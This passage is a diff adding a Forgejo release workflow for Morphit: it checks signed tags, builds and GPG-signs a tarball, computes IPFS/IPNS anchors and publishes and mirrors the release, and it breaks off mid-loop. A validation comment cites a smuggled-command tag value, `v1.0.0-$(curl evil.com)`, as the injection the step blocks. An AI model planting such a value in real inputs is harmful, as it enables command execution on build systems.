@@ -1,0 +1,717 @@
+# Morphit release workflow — fires on annotated-tag push.
+#
+# Runs the full validation gate (typecheck + ansible-lint +
+# triple-pulse smokes) AGAIN at release time (defensive — even
+# though ci.yml runs on every push, tag pushes may bypass
+# branch-protected CI in some forge configs), then builds a
+# release tarball with the manifest of files needed to reproduce
+# the deploy.
+#
+# Tag format: `v<MAJOR>.<MINOR>.<PATCH>` (e.g. `v1.0.0-beta.1`).
+#
+# Output: a `morphit-<tag>.tar.gz` archive uploaded as a release
+# artifact.
+
+name: morphit-release
+
+on:
+  push:
+    tags:
+      - 'v*'
+
+# Releases should never race each other.
+concurrency:
+  group: morphit-release-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  release:
+    name: Build + publish release tarball
+    runs-on: ubuntu-24.04
+    # NB: Forgejo does NOT implement GitHub's `permissions:` key (it warns
+    # and ignores it), so we don't set one. The Publish step's token scope
+    # comes from Forgejo's default Actions token (repo-scoped) or, if that
+    # is capped, an operator-supplied MORPHIT_RELEASE_TOKEN secret.
+    # cp145 — release does the smokes-job's work (~18 min) plus
+    # tag verification, tarball build, checksum, upload.  Observed
+    # runtime ~25 min.  60-minute ceiling = 2.4× headroom.
+    timeout-minutes: 60
+
+    steps:
+      - name: Checkout (full history for git describe)
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+        with:
+          fetch-depth: 0
+
+      - name: Import authorized release-signer keys
+        # Part 122 cp8 — release-signer pubkeys live in
+        # `.forgejo/release-signers/*.asc` (ASCII-armored, one per
+        # authorized maintainer).  We import them into the runner's
+        # keyring so the next step can verify the tag signature.
+        # Adding a new signer = adding a new .asc file in that
+        # directory and getting the PR merged.
+        run: |
+          set -eu
+          if [ ! -d .forgejo/release-signers ]; then
+            echo "ERROR: .forgejo/release-signers/ directory missing — no authorized signers configured" >&2
+            exit 1
+          fi
+          asc_count=$(find .forgejo/release-signers -name '*.asc' -type f | wc -l)
+          if [ "$asc_count" -eq 0 ]; then
+            echo "ERROR: no *.asc pubkey files in .forgejo/release-signers/" >&2
+            exit 1
+          fi
+          for key in .forgejo/release-signers/*.asc; do
+            echo "Importing $key"
+            gpg --import "$key"
+          done
+          echo "Imported $asc_count authorized signer key(s)."
+
+      - name: Restore annotated tag (actions/checkout strips signatures)
+        # Forgejo Actions (and GitHub Actions) ship a version of
+        # actions/checkout that, after fetching all refs correctly,
+        # performs a SECOND fetch of the form
+        # `+<commit-sha>:refs/tags/<tag>` which force-rewrites the
+        # tag in the runner's local workspace to a lightweight
+        # pointer at the commit.  This destroys the annotated tag
+        # object locally — and therefore destroys the signature —
+        # even though the tag on the Forgejo server is still a
+        # proper annotated signed tag.
+        #
+        # `git verify-tag` operates on the local copy, so it sees
+        # the lightweight pointer and fails with:
+        #   "cannot verify a non-tag object of type commit"
+        #
+        # Re-fetch the tag in its annotated form before verify.
+        # The `+refs/tags/X:refs/tags/X` refspec preserves tag
+        # objects (vs the commit-SHA refspec checkout uses).
+        # See: github.com/actions/checkout issue #290 / #1467.
+        env:
+          TAG: ${{ github.ref_name }}
+        run: |
+          set -eu
+          git fetch origin "+refs/tags/${TAG}:refs/tags/${TAG}" --force
+          # Sanity-check: confirm we now have a tag object, not a
+          # commit.  If this fails, the fetch above didn't restore
+          # the annotated form (which would mean the tag on the
+          # server is also lightweight — a separate bug).
+          OBJTYPE=$(git cat-file -t "${TAG}")
+          if [ "$OBJTYPE" != "tag" ]; then
+            echo "ERROR: ${TAG} is a '${OBJTYPE}' object, not 'tag'" >&2
+            echo "       This means the tag on the server is lightweight." >&2
+            echo "       Delete and recreate with: git tag -s ${TAG} -m '...'" >&2
+            exit 1
+          fi
+          echo "✓ ${TAG} restored as annotated tag object"
+
+      - name: Verify tag is signed by an authorized key
+        # Part 122 cp8 — the tag itself must be a signed annotated
+        # tag (`git tag -s vX.Y.Z`).  `git verify-tag` consults
+        # the keyring populated above; if the tag isn't signed,
+        # or is signed by a key not in `.forgejo/release-signers/`,
+        # this step fails and the release does not proceed.
+        # Defense against a compromised CI runner producing
+        # tarballs from arbitrary commits.
+        env:
+          TAG: ${{ github.ref_name }}
+        run: |
+          set -eu
+          echo "Verifying tag signature for $TAG"
+          git verify-tag "$TAG"
+          echo "✓ tag signed by an authorized key"
+
+      - name: Install Node.js 22 LTS
+        uses: actions/setup-node@1e60f620b9541d16bece96c5465dc8ee9832be0b # v4.0.3
+        with:
+          node-version: 22
+          cache: npm
+
+      - name: Install build tools (for better-sqlite3 native)
+        run: |
+          # cp190 — scope apt update to the base Ubuntu repos so a
+          # transient Hash-Sum-mismatch on a third-party repo in the
+          # runner image (e.g. repo.zabbix.com) can't fail the release
+          # build.  Matches the ci.yml hardening.
+          for i in 1 2 3; do
+            sudo apt-get update -qq \
+              -o Dir::Etc::sourceparts=- \
+              -o APT::Get::List-Cleanup=0 && break
+            echo "apt-get update attempt $i failed; retrying in 5s..."
+            sleep 5
+          done
+          sudo apt-get install -y --no-install-recommends \
+            build-essential python3 python3-pip
+
+      - name: Install workspace dependencies
+        run: npm ci --no-audit --no-fund
+
+      - name: Install ansible-lint + collections
+        run: |
+          pip3 install --break-system-packages --quiet \
+            ansible ansible-lint
+          ansible-galaxy collection install -r \
+            ops/ansible/collections/requirements.yml
+
+      - name: Typecheck sweep
+        run: bash scripts/typecheck-sweep.sh
+
+      - name: ansible-lint (production profile)
+        working-directory: ops/ansible
+        run: ansible-lint --offline --strict playbook.yml
+
+      - name: Triple-pulse smokes
+        run: |
+          for i in 1 2 3; do
+            echo "=== Pulse $i ==="
+            bash scripts/run-smokes.sh
+          done
+
+      - name: Compute release version + validate tag format
+        id: ver
+        run: |
+          set -eu
+          TAG="${GITHUB_REF#refs/tags/}"
+          # AUDIT-CI-7 (cp17 deep-deep): validate the tag format
+          # STRICTLY before letting it flow into shell-interpolated
+          # contexts.  git-check-ref-format permits `$`, `(`, `)`,
+          # spaces, and other shell-metacharacters; we permit only
+          # the tag grammar we actually use: `v<num>.<num>.<num>`
+          # optionally followed by `-<alnum-and-dots>`.  This
+          # blocks injection like `v1.0.0-$(curl evil.com)`.
+          case "$TAG" in
+              v[0-9]*.[0-9]*.[0-9]*|v[0-9]*.[0-9]*.[0-9]*-*)
+                  ;;
+              *)
+                  echo "ERROR: tag '$TAG' does not match v<n>.<n>.<n>[-<pre>]" >&2
+                  exit 1
+                  ;;
+          esac
+          # Belt-and-braces: also reject any char outside the
+          # narrow whitelist [A-Za-z0-9.-].  Even if the case-glob
+          # above accepts something weird, this catches it.
+          case "$TAG" in
+              *[!A-Za-z0-9.-]*)
+                  echo "ERROR: tag '$TAG' contains forbidden chars" >&2
+                  exit 1
+                  ;;
+          esac
+          echo "tag=${TAG}" >> "$GITHUB_OUTPUT"
+          echo "tarball=morphit-${TAG}.tar.gz" >> "$GITHUB_OUTPUT"
+
+      - name: Generate release-info.json (in-tarball provenance manifest)
+        # Part 122 cp8 — bake a manifest into the tarball that
+        # `morphit-ops upgrade` reads to verify the operator is
+        # extracting the version they think they are.  Survives
+        # tarball-rename mistakes (operator renames the file
+        # → `morphit-ops upgrade` still reads the canonical
+        # version from inside).  Contents:
+        #   tag         — the release tag (e.g. v1.0.0-beta.1)
+        #   commit      — full git commit SHA the tarball was built from
+        #   build_time  — ISO 8601 UTC of CI build
+        #   builder     — "forgejo-actions" (provenance hint)
+        env:
+          TAG: ${{ steps.ver.outputs.tag }}
+        run: |
+          set -eu
+          COMMIT=$(git rev-parse HEAD)
+          BUILD_TIME=$(date -u +'%Y-%m-%dT%H:%M:%SZ')
+          cat > release-info.json <<EOF
+          {
+            "tag": "${TAG}",
+            "commit": "${COMMIT}",
+            "build_time": "${BUILD_TIME}",
+            "builder": "forgejo-actions"
+          }
+          EOF
+          cat release-info.json
+
+      - name: Build release tarball
+        # Stage the output in /tmp so tar never sees its own
+        # output land inside the directory it's reading.  Writing
+        # the tarball directly into `.` updates the directory's
+        # mtime mid-walk and tar bails with `.: file changed as
+        # we read it` (run 406, even after the per-file exclude
+        # from run 401).  Staging in /tmp and moving the finished
+        # tarball back is the standard workaround.
+        #
+        # AUDIT-CI-7: tag value passed via env, not ${{ }}
+        # interpolation, so bash sees a plain variable (no
+        # command substitution on the tag content).
+        env:
+          TARBALL: ${{ steps.ver.outputs.tarball }}
+        run: |
+          set -eu
+          STAGE=$(mktemp -d)
+          tar --exclude='./node_modules' \
+              --exclude='./.git' \
+              --exclude='./out' \
+              --exclude='./dist' \
+              --exclude='./apps/*/node_modules' \
+              --exclude='./apps/*/dist' \
+              --exclude='./apps/*/build' \
+              --exclude='./packages/*/node_modules' \
+              --exclude='./packages/*/dist' \
+              --exclude='*.log' \
+              -czf "${STAGE}/${TARBALL}" .
+          mv "${STAGE}/${TARBALL}" "./${TARBALL}"
+          rmdir "${STAGE}"
+
+      - name: Compute tarball checksum
+        env:
+          TARBALL: ${{ steps.ver.outputs.tarball }}
+        run: |
+          set -eu
+          sha256sum "$TARBALL" > "$TARBALL.sha256"
+          cat "$TARBALL.sha256"
+
+      - name: Sign release tarball (detached GPG signature)
+        # beta5 — source-independent integrity for mirror downloads.
+        # `morphit-ops upgrade` verifies this `*.tar.gz.asc` against the
+        # release-signer PUBLIC keys shipped in the install at
+        # `.forgejo/release-signers/*.asc`, so a tarball fetched from ANY
+        # mirror is trustworthy (no need to trust the mirror).
+        #
+        # Requires two repo secrets (set them in Forgejo → repo →
+        # Settings → Actions → Secrets):
+        #   MORPHIT_RELEASE_SIGNING_KEY         — ASCII-armored PRIVATE
+        #     key whose PUBLIC half is committed under
+        #     .forgejo/release-signers/ (so operators can verify).
+        #   MORPHIT_RELEASE_SIGNING_PASSPHRASE  — its passphrase (or
+        #     empty if the key has none).
+        #
+        # If the secret is not set, signing is SKIPPED (CI still passes,
+        # the release is published unsigned) — but mirror installs will
+        # then fall back to primary-anchored-hash only.  See
+        # docs/UPGRADING.md.
+        env:
+          TARBALL: ${{ steps.ver.outputs.tarball }}
+          SIGNING_KEY: ${{ secrets.MORPHIT_RELEASE_SIGNING_KEY }}
+          SIGNING_PASSPHRASE: ${{ secrets.MORPHIT_RELEASE_SIGNING_PASSPHRASE }}
+        run: |
+          set -eu
+          if [ -z "${SIGNING_KEY:-}" ]; then
+            echo "::warning::MORPHIT_RELEASE_SIGNING_KEY not set — publishing UNSIGNED release (mirror installs limited to primary-anchored-hash). See docs/UPGRADING.md."
+            exit 0
+          fi
+          SIGN_HOME="$(mktemp -d)"
+          chmod 700 "$SIGN_HOME"
+          export GNUPGHOME="$SIGN_HOME"
+          printf '%s' "$SIGNING_KEY" | gpg --batch --import
+          KEYID="$(gpg --list-secret-keys --with-colons | awk -F: '/^sec:/ {print $5; exit}')"
+          if [ -z "$KEYID" ]; then
+            echo "ERROR: no secret key found after import" >&2
+            rm -rf "$SIGN_HOME"; exit 1
+          fi
+          gpg --batch --yes --pinentry-mode loopback \
+            --passphrase "${SIGNING_PASSPHRASE:-}" \
+            --local-user "$KEYID" \
+            --armor --detach-sign --output "$TARBALL.asc" "$TARBALL"
+          # Sanity: verify what we just produced before publishing.
+          gpg --batch --verify "$TARBALL.asc" "$TARBALL"
+          echo "Signed $TARBALL with key $KEYID."
+          rm -rf "$SIGN_HOME"
+
+      - name: Compute canonical IPFS CID (self-hosted seed model — Kubo, no pinning service)
+        # v1.9.3: releases are hosted on our OWN nodes (Ken's release box seeds via
+        # ops/ipfs/morphit-ipfs-seed.sh; every instance's Kubo pins), so CI does NOT
+        # upload anywhere. It only COMPUTES the DETERMINISTIC directory CID with the
+        # SAME pinned Kubo the seed uses, over the SAME shared staging script
+        # (ops/ipfs/stage-release-dir.sh) — so CI's --only-hash CID EQUALS the CID the
+        # seed box produces + hosts (the seed asserts equality when it hosts). That
+        # directory CID is anchored on-chain as ipfs_cid; ipns://<name> is repointed
+        # at it below. No secret, no account, no cost. ANY failure here is NON-FATAL
+        # (git mirrors + on-chain SHA-256 are the real anchors) — it just means no
+        # ipfs_cid this run, which the Block-4 dry-run makes visible.
+        #
+        # KUBO_VERSION + KUBO_SHA512 MUST stay in sync with
+        # ops/ipfs/morphit-ipfs-setup.sh (asserted by ipfs-selfseed-smoke). The binary
+        # is pinned + checksum-verified — never an unverified binary in the release path.
+        env:
+          TARBALL: ${{ steps.ver.outputs.tarball }}
+          TAG: ${{ steps.ver.outputs.tag }}
+          KUBO_VERSION: v0.42.0
+          KUBO_SHA512: 054c38a0cf66f7d738e25085ad62cb3a42d03d4bac329b7dd25c1d71cf18e1ce87d55b1d1b705b04c65210dca9109973579e0eb1cd72f6341ecb3311d840d156
+        run: |
+          set -u
+          # 1. Install the pinned Kubo (checksum-verified) into a scratch dir.
+          KUBO_DIR="$(mktemp -d)"
+          KTAR="kubo_${KUBO_VERSION}_linux-amd64.tar.gz"
+          if ! curl -fsSL "https://dist.ipfs.tech/kubo/${KUBO_VERSION}/${KTAR}" -o "${KUBO_DIR}/${KTAR}"; then
+            echo "WARNING: could not download Kubo ${KUBO_VERSION} — no ipfs_cid this run (release proceeds)." >&2
+            exit 0
+          fi
+          GOT=$(sha512sum "${KUBO_DIR}/${KTAR}" | awk '{print $1}')
+          if [ "$(echo "$GOT" | tr 'A-Z' 'a-z')" != "$(echo "$KUBO_SHA512" | tr 'A-Z' 'a-z')" ]; then
+            echo "WARNING: Kubo SHA-512 mismatch vs pin — refusing the binary; no ipfs_cid this run." >&2
+            exit 0
+          fi
+          tar -xzf "${KUBO_DIR}/${KTAR}" -C "${KUBO_DIR}"
+          IPFS_BIN="${KUBO_DIR}/kubo/ipfs"
+          chmod +x "$IPFS_BIN" 2>/dev/null || true
+          export IPFS_PATH="$(mktemp -d)"
+          "$IPFS_BIN" init --profile lowpower >/dev/null 2>&1 || true
+          # 2. Stage the canonical directory from the LOCAL just-built tarball via the
+          #    SHARED script (identical to what the seed box stages → identical CID).
+          STAGE="$(mktemp -d)/morphit"
+          mkdir -p "$STAGE"
+          if ! MORPHIT_STAGE_TARBALL="$TARBALL" \
+               MORPHIT_STAGE_SHA256="${TARBALL}.sha256" \
+               sh ops/ipfs/stage-release-dir.sh "$TAG" "$STAGE"; then
+            echo "WARNING: staging failed — no ipfs_cid this run." >&2
+            exit 0
+          fi
+          # 3. Compute the DETERMINISTIC directory CID (offline: no upload, no daemon).
+          CID="$("$IPFS_BIN" add -rQ --cid-version 1 --only-hash "$STAGE" 2>/dev/null || true)"
+          if [ -z "${CID:-}" ]; then
+            echo "WARNING: ipfs add --only-hash produced no CID — no ipfs_cid this run." >&2
+            exit 0
+          fi
+          printf '%s' "$CID" > ipfs-cid.txt
+          echo "Canonical IPFS CID (seeded by the release box + anchored on-chain): $CID"
+          echo "  the seed hosts THIS exact CID; instances pin it; ipns://<name> repoints to it below."
+
+      - name: Sign stable IPNS record (optional — DHT-native, sign-once/rebroadcast-only)
+        # OPTIONAL "always find the latest" pointer, resolvable on the PUBLIC DHT
+        # (v1.9.6). If a MORPHIT_IPNS_KEY secret is set, sign an IPNS record pointing
+        # Morphit's STABLE name at THIS release's CID — LOCALLY (scripts/ipns-sign.mjs;
+        # the key never leaves this process) with a 1-year lifetime. The signed record
+        # (base64) is written to ipns-record.txt and the k51… name to ipns-name.txt;
+        # both are carried into the on-chain anchor below. Every instance then reads the
+        # record (via /v1/release) and rebroadcasts it to the DHT WITHOUT the key, so
+        # ipns://<name> resolves on any gateway for as long as one instance lives — and
+        # no instance can repoint it (minting/bumping requires the key; the sequence is
+        # signed). This REPLACES the old w3name publish: w3name stored records in its
+        # own service, OFF the DHT, so public gateways never resolved them.
+        #
+        # The sequence is the build's unix timestamp: strictly monotonic across releases
+        # (newest wins on resolve) with no fragile chain read, and comfortably above any
+        # legacy w3name sequence so the DHT record supersedes anything cached. NO key →
+        # skipped; ANY failure is NON-FATAL (IPNS is additive to the immutable ipfs_cid
+        # + git mirrors + on-chain SHA-256). Deps go in a scratch dir so the monorepo's
+        # lockfile stays untouched. Broadcast (Block 5) is laptop-only; signing the IPNS
+        # record is safe in CI — the key only repoints a name, never touches funds.
+        env:
+          MORPHIT_IPNS_KEY: ${{ secrets.MORPHIT_IPNS_KEY }}
+        run: |
+          set -u
+          if [ -z "${MORPHIT_IPNS_KEY:-}" ]; then
+            echo "No MORPHIT_IPNS_KEY secret — skipping IPNS sign (release proceeds without ipns_record)."
+            exit 0
+          fi
+          if [ ! -s ipfs-cid.txt ]; then
+            echo "No ipfs-cid.txt (CID computation skipped/failed) — nothing to point the name at; skipping."
+            exit 0
+          fi
+          RELEASE_CID=$(cat ipfs-cid.txt)
+          SEQ=$(date -u +%s)
+          echo "Signing IPNS record → /ipfs/${RELEASE_CID} (seq ${SEQ}) for DHT rebroadcast…"
+          WORK=$(mktemp -d)
+          cp scripts/ipns-sign.mjs "$WORK/ipns-sign.mjs"
+          ( cd "$WORK" && npm init -y >/dev/null 2>&1 && npm i ipns w3name @libp2p/peer-id >/dev/null 2>&1 ) || {
+            echo "WARNING: could not install ipns deps — skipping IPNS (no ipns_record)." >&2
+            exit 0
+          }
+          if RELEASE_CID="${RELEASE_CID}" MORPHIT_IPNS_SEQUENCE="${SEQ}" node "$WORK/ipns-sign.mjs" > ipns-sign.json 2> ipns-sign.log; then
+            sed 's/^/  /' ipns-sign.log >&2 || true
+            node -e 'const fs=require("fs");const j=JSON.parse(fs.readFileSync("ipns-sign.json","utf8"));fs.writeFileSync("ipns-name.txt",j.name);fs.writeFileSync("ipns-record.txt",j.record)'
+            echo "IPNS record signed: name=$(cat ipns-name.txt), record=$(wc -c < ipns-record.txt) b64 chars."
+          else
+            echo "WARNING: IPNS sign did not complete — continuing without ipns_record." >&2
+            sed 's/^/  /' ipns-sign.log >&2 || true
+            rm -f ipns-name.txt ipns-record.txt ipns-sign.json
+          fi
+
+      - name: Write distribution anchor (source_sha256 + gpg_fingerprint)
+        # The on-chain morphit_release_v1 `distribution` block anchors the
+        # SHA-256 of THIS canonical tarball (the one published below) plus the
+        # release-signer key fingerprint, so a downloader can prove a copy is
+        # genuine against the chain. The hash MUST be the published tarball's —
+        # this job built it; a laptop `git archive` would produce different
+        # bytes and a mismatched anchor (the old release-sign.sh footgun). The
+        # fingerprint is derived from the committed release-signer PUBLIC key
+        # (no secret): it is the key that signed this tag (verified above), i.e.
+        # exactly what `git verify-tag` checks. The mirror list is a fixed
+        # default baked into the payload builder, so it is NOT written here. The
+        # ELI5 ceremony fetches this file back from the release and `source`s it
+        # before building the on-chain payload.
+        env:
+          TARBALL: ${{ steps.ver.outputs.tarball }}
+          TAG: ${{ steps.ver.outputs.tag }}
+        run: |
+          set -eu
+          SHA256=$(awk '{print $1}' "$TARBALL.sha256")
+          FPR=$(gpg --show-keys --with-colons .forgejo/release-signers/agorise.asc \
+                | awk -F: '$1=="fpr"{print $10; exit}')
+          if [ -z "${SHA256:-}" ] || [ -z "${FPR:-}" ]; then
+            echo "ERROR: could not derive the anchor (sha256='${SHA256:-}' fpr='${FPR:-}')" >&2
+            exit 1
+          fi
+          {
+            echo "# Morphit distribution anchor for ${TAG} — source this before building the on-chain payload."
+            echo "export MORPHIT_BUILD_SOURCE_SHA256=${SHA256}"
+            echo "export MORPHIT_BUILD_GPG_FINGERPRINT=${FPR}"
+            # Optional canonical IPFS CID from the compute step above (present
+            # unless Kubo download/staging failed). Sourced by the ELI5 Block 4,
+            # it flows into the payload builder's `ipfs_cid` and is anchored
+            # on-chain alongside the mirrors; the release box seeds THIS exact CID
+            # and instances pin it. Absent → the block simply omits ipfs_cid
+            # (schema-optional), exactly as before.
+            if [ -s ipfs-cid.txt ]; then
+              echo "export MORPHIT_BUILD_IPFS_CID=$(cat ipfs-cid.txt)"
+            fi
+            # Optional stable IPNS name from the publish step above (present only
+            # if a MORPHIT_IPNS_KEY secret is set and the publish succeeded).
+            # Sourced by ELI5 Block 4, it flows into the payload builder's
+            # `ipns_name` and is anchored on-chain as the canonical "always
+            # latest" pointer. Absent → the block omits ipns_name (schema-optional).
+            if [ -s ipns-name.txt ]; then
+              echo "export MORPHIT_BUILD_IPNS_NAME=$(cat ipns-name.txt)"
+            fi
+            # Optional signed IPNS record (base64) from the sign step above (v1.9.6):
+            # the DHT-rebroadcast pointer. Sourced by ELI5 Block 4 into the payload
+            # builder's `ipns_record` and anchored on-chain, where every instance reads
+            # it (via /v1/release) and rebroadcasts it to the DHT. Absent → omitted
+            # (schema-optional), exactly as before.
+            if [ -s ipns-record.txt ]; then
+              echo "export MORPHIT_BUILD_IPNS_RECORD=$(cat ipns-record.txt)"
+            fi
+          } > distribution-anchor.env
+          echo "── distribution-anchor.env ──"
+          cat distribution-anchor.env
+
+      - name: Upload release artifact
+        # AUDIT-CI-2 — Forgejo Actions does not implement the
+        # `@actions/artifact` v2 backend that upload-artifact@v4+
+        # requires (run 411 surfaced this with the explicit
+        # `GHESNotSupportedError: @actions/artifact v2.0.0+,
+        # upload-artifact@v4+ and download-artifact@v4+ are not
+        # currently supported on GHES`).  Pin to v3, which uses
+        # the older backend Forgejo does support.
+        #
+        # Tag-based pinning rather than SHA-pinning here: Forgejo
+        # mirrors all action sources via data.forgejo.org, which
+        # is already the trust boundary for every action in this
+        # workflow.  v3 is a stable security-supported branch;
+        # the tag won't relocate.
+        uses: actions/upload-artifact@v3
+        with:
+          name: ${{ steps.ver.outputs.tag }}
+          path: |
+            ${{ steps.ver.outputs.tarball }}
+            ${{ steps.ver.outputs.tarball }}.sha256
+            ${{ steps.ver.outputs.tarball }}.asc
+            distribution-anchor.env
+          retention-days: 90
+          if-no-files-found: warn
+
+      - name: Build self-contained offline tarball (best-effort)
+        # The offline appliance: bundles node_modules PLUS the OS packages, Docker
+        # images, Node runtime and Kubo, so Morphit installs with NO internet.
+        # BEST-EFFORT (continue-on-error) so a runner without Docker — or without
+        # reach to Docker Hub / nodejs.org / dist.ipfs.tech / download.docker.com —
+        # can NEVER block the release: the slim source tarball still publishes, and
+        # this tarball can be built separately on any Ubuntu 24.04 + Docker box with
+        # `bash scripts/build-offline-bundle.sh`.  The attach loop below skips it
+        # when absent, so nothing downstream depends on this step succeeding.
+        continue-on-error: true
+        run: |
+          set -eu
+          bash scripts/build-offline-bundle.sh
+          ls -lh morphit-*-offline.tar.gz* || true
+
+      - name: Publish Forgejo release + attach assets
+        # Auto-create the release for this tag and attach the artifacts, so the
+        # operator downloads + uploads NOTHING (this replaces the old manual
+        # "download the zip, make a release, upload files" dance). Uses the
+        # Forgejo API with the runner's automatic Actions token. If that token
+        # lacks release-write permission the step FAILS LOUDLY with remediation
+        # — and the artifacts are still retained by the upload-artifact step
+        # above as a manual fallback, so a first-run permission miss loses
+        # nothing. Broadcasting to the chain is deliberately NOT here: a
+        # spending key must never live in CI. That stays a laptop step in the
+        # ELI5 ceremony.
+        #
+        # Tag value flows via env (not ${{ }} interpolation into the shell),
+        # matching AUDIT-CI-7; the tag is already format-validated in `ver`.
+        env:
+          TAG: ${{ steps.ver.outputs.tag }}
+          TARBALL: ${{ steps.ver.outputs.tarball }}
+          # Prefer an operator-supplied token (only needed if the default
+          # Forgejo Actions token can't write releases); otherwise fall back
+          # to the automatic token. Forgejo's `permissions:` key is ignored,
+          # so token scope is set by the instance / this optional secret.
+          RELEASE_TOKEN: ${{ secrets.MORPHIT_RELEASE_TOKEN }}
+          AUTO_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -eu
+          TOKEN="${RELEASE_TOKEN:-$AUTO_TOKEN}"
+          if [ -z "${TOKEN:-}" ]; then
+            echo "ERROR: no token available. Add a token with repository (write) scope as an Actions secret named MORPHIT_RELEASE_TOKEN." >&2
+            exit 1
+          fi
+          API="${GITHUB_API_URL:-${GITHUB_SERVER_URL}/api/v1}"
+          REPO="${GITHUB_REPOSITORY}"
+          AUTH="Authorization: token ${TOKEN}"
+          # 1. Build the release JSON. The body is the matching RELEASE-NOTES
+          # file, JSON-encoded by node so any quotes / newlines / backticks in
+          # the notes can't break the payload. Missing file => empty body (never
+          # fails the release). The PATCH variant omits tag_name so a re-run can
+          # NEVER re-point or re-create the signed tag.
+          NOTES_FILE="RELEASE-NOTES-${TAG}.md"
+          NOTES_FILE="$NOTES_FILE" node -e '
+            const fs = require("fs");
+            const tag = process.env.TAG;
+            let body = "";
+            try { body = fs.readFileSync(process.env.NOTES_FILE, "utf8"); } catch (e) {}
+            const name = "Morphit " + tag;
+            fs.writeFileSync("/tmp/rel-create.json", JSON.stringify({ tag_name: tag, name, body, draft: false, prerelease: false }));
+            fs.writeFileSync("/tmp/rel-patch.json", JSON.stringify({ name, body, draft: false, prerelease: false }));
+          '
+          if [ -s "$NOTES_FILE" ]; then echo "release body := ${NOTES_FILE}"; else echo "no ${NOTES_FILE}; publishing with an empty body"; fi
+          # 2. Create the release for this tag (or reuse it on a re-run).
+          REUSED=0
+          CODE=$(curl -sS -o /tmp/rel.json -w '%{http_code}' -X POST \
+            -H "$AUTH" -H 'Content-Type: application/json' \
+            --data-binary @/tmp/rel-create.json "${API}/repos/${REPO}/releases" || true)
+          if [ "$CODE" = "201" ]; then
+            echo "Created release ${TAG}."
+          elif [ "$CODE" = "409" ]; then
+            echo "Release ${TAG} already exists; will attach assets + refresh the notes."
+            REUSED=1
+            curl -sS -H "$AUTH" -o /tmp/rel.json "${API}/repos/${REPO}/releases/tags/${TAG}"
+          else
+            echo "ERROR: creating the release failed (HTTP ${CODE})." >&2
+            if [ "$CODE" = "403" ]; then
+              echo "  The token lacks release-write permission." >&2
+              echo "  Fix (4 clicks): your avatar -> Settings -> Applications -> Generate New Token (repository: write)," >&2
+              echo "  then repo -> Settings -> Actions -> Secrets -> add it as MORPHIT_RELEASE_TOKEN. It is picked up automatically." >&2
+            fi
+            cat /tmp/rel.json >&2 || true
+            exit 1
+          fi
+          REL_ID=$(node -e 'const o=JSON.parse(require("fs").readFileSync("/tmp/rel.json","utf8"));if(!o.id){console.error("no release id in API response");process.exit(1)}process.stdout.write(String(o.id))')
+          echo "Release id: ${REL_ID}"
+          # 3. On a re-run the release already existed, so the create call above
+          # did not set the notes. PATCH the body now (tag_name omitted, so the
+          # signed tag is never touched).
+          if [ "$REUSED" = "1" ]; then
+            curl -sS -o /dev/null -X PATCH \
+              -H "$AUTH" -H 'Content-Type: application/json' \
+              --data-binary @/tmp/rel-patch.json "${API}/repos/${REPO}/releases/${REL_ID}" || true
+            echo "refreshed release body from ${NOTES_FILE}"
+          fi
+          # 4. Attach each asset that exists (.asc is absent when unsigned; the
+          # -offline tarball is absent if the best-effort build step was skipped
+          # or the runner lacked Docker — either way the loop just skips it).
+          for f in "$TARBALL" "$TARBALL.sha256" "$TARBALL.asc" distribution-anchor.env \
+                   "morphit-${TAG}-offline.tar.gz" "morphit-${TAG}-offline.tar.gz.sha256"; do
+            if [ ! -f "$f" ]; then echo "skip (absent): $f"; continue; fi
+            NAME=$(basename "$f")
+            CODE=$(curl -sS -o /tmp/asset.json -w '%{http_code}' -X POST \
+              -H "$AUTH" -F "attachment=@${f}" \
+              "${API}/repos/${REPO}/releases/${REL_ID}/assets?name=${NAME}" || true)
+            if [ "$CODE" = "201" ]; then
+              echo "attached ${NAME}"
+            else
+              echo "ERROR: attaching ${NAME} failed (HTTP ${CODE})." >&2
+              cat /tmp/asset.json >&2 || true
+              exit 1
+            fi
+          done
+          echo "✓ release ${TAG} published with all assets attached."
+
+      - name: Mirror the release to codeberg.org + gitea.com (best-effort)
+        # codeberg.org (Forgejo) + gitea.com (Gitea) speak our OWN /api/v1 release
+        # API, so publishing the SAME release + assets there lets `morphit-ops
+        # upgrade` auto-rotate to them when git.agorise.net is down — the upgrader
+        # ships them as built-in mirrors (parseReleaseSources), no operator config.
+        # Our other 9 download-page mirrors are git PUSH-mirrors on different APIs
+        # (GitHub/GitLab/…) and stay out of this — they carry the signed tag + source,
+        # not a release object.
+        #
+        # BEST-EFFORT BY DESIGN: a missing token or a mirror outage only ::warning::s
+        # and moves on — the primary (published above) is the SHA-256 anchor, so a
+        # release NEVER fails because of a mirror. Enable each mirror by adding a
+        # repository-write PAT as an Actions secret (CODEBERG_TOKEN for codeberg.org /
+        # GITEA_COM_TOKEN for gitea.com); until then the step just skips that mirror.
+        #
+        # Tag flows via env (AUDIT-CI-7), already format-validated in `ver`.
+        env:
+          TAG: ${{ steps.ver.outputs.tag }}
+          TARBALL: ${{ steps.ver.outputs.tarball }}
+          CODEBERG_TOKEN: ${{ secrets.CODEBERG_TOKEN }}
+          GITEA_COM_TOKEN: ${{ secrets.GITEA_COM_TOKEN }}  # token for the gitea.com mirror
+        run: |
+          set -u
+          # Reuse the SAME release JSON shape as the primary step (node-encoded body,
+          # so quotes/newlines in the notes can't break the payload; missing notes =>
+          # empty body). tag_name is set on create; a re-run reuses the release and
+          # never re-points the signed tag.
+          NOTES_FILE="RELEASE-NOTES-${TAG}.md"
+          NOTES_FILE="$NOTES_FILE" node -e '
+            const fs = require("fs");
+            const tag = process.env.TAG;
+            let body = "";
+            try { body = fs.readFileSync(process.env.NOTES_FILE, "utf8"); } catch (e) {}
+            fs.writeFileSync("/tmp/mrel-create.json", JSON.stringify({ tag_name: tag, name: "Morphit " + tag, body, draft: false, prerelease: false }));
+          '
+          publish_to() {
+            HOST="$1"; REPO="$2"; TOKEN="$3"
+            if [ -z "${TOKEN:-}" ]; then
+              echo "::warning::${HOST}: no token set — skipping release mirror (add its Actions secret to enable)."
+              return 0
+            fi
+            API="https://${HOST}/api/v1"
+            AUTH="Authorization: token ${TOKEN}"
+            # A push-mirror replicates the signed tag asynchronously (usually seconds).
+            # Wait for it before creating the release — a release needs its tag to exist,
+            # and we must NEVER create the tag here (that would diverge from the mirror).
+            TC=000
+            i=0
+            while [ "$i" -lt 12 ]; do
